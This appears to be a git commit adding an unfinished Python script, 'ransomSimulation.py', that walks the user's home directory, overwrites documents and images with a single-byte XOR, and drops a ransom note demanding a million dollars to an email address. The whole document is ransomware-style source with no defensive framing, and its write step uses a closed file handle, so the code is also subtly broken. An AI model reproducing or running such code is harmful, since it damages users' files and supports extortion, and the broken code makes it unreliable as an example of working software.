1921c2fd402c91c58bff050195db9ec2af15d6fa
Gunnar Jones <35942923+gunSec@users.noreply.github.com>
2022-11-09 17:43:49 -0500

    Create ransomSimulation.py
    initial upload, not finished

---
+++ scripts/ransomSimulation.py
@@ -0,0 +1,44 @@
+import os
+
+exts = ['.pdf', '.docx', '.ppt', '.txt', '.xls', '.png', '.jpg']
+
+
+#gets list of files for encryption
+def start(userdir):
+    for root, dirs, files in os.walk(userdir, topdown=True):
+        for name in files:
+            target = os.path.join(root,name)
+            ext = os.path.splitext(name)
+            if ext[1] in exts:
+                encrypt(target)
+
+
+def xord(data):
+    return bytearray([b^0xA8 for b in bytearray(data)])
+
+
+#It will XOR the data from a file once with b^0xA8
+def encrypt(file):
+    with open(file, 'rb') as f:
+        data = f.read()
+    with open(file, 'wb') as fp:
+        f.write(xord(data))
+
+
+def note(userdir):
+    note = """ 
+    lmao yout got owned,
+    I need 1 million dollars to ransomguy@sh4man.dev
+    """
+    notepath = os.path.join(userdir, "Desktop", "README_TO_DECRPYPT.txt")
+    with open(notepath, 'w') as f:
+        f.write(note)
+
+
+def main():
+    userdir = os.path.expanduser('~')
+    note(userdir)
+    start(userdir)
+
+if __name__ == "__main__":
+    main()
